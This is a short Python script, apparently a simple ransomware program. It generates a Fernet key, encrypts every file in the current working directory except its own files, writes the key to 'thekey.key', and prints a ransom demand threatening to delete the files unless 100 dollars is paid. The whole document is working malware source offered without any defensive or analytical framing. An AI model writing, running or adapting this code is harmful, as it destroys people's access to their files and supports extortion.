import os
from cryptography.fernet import Fernet
from cryptography.fernet import InvalidToken

def generate_key():
    # Generate a new encryption key
    return Fernet.generate_key()

def load_key():
    # Load the encryption key from a file
    return open("thekey.key", "rb").read()

def encrypt_file(file_path, key):
    # Encrypt the specified file using the provided key
    f = Fernet(key)  # Create a Fernet object with the given key
    with open(file_path, "rb") as file:
        file_data = file.read()  # Read the file data
    try:
        encrypted_data = f.encrypt(file_data)  # Encrypt the file data
    except InvalidToken:
        print(f"Error: Unable to encrypt {file_path}.")  # Handle encryption errors
        return
    with open(file_path, "wb") as file:
        file.write(encrypted_data)  # Write the encrypted data back to the file

def main():
    # Main function to execute the encryption process
    key = generate_key()  # Generate a new encryption key
    files = []  # List to hold files to be encrypted
    for file in os.listdir():  # Iterate through files in the current directory
        # Skip the script itself and key file
        if file == "main.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):  # Check if it is a file
            files.append(file)  # Add file to the list

    # Save the generated key to a file
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    # Encrypt each file in the list
    for file in files:
        encrypt_file(file, key)

    # Notify the user about the encryption and ransom
    print("All of your files are encrypted. You've to give me 100$ to decrypt them or i'll delete them.")

if __name__ == "__main__":
    main()  # Execute the main function when the script is run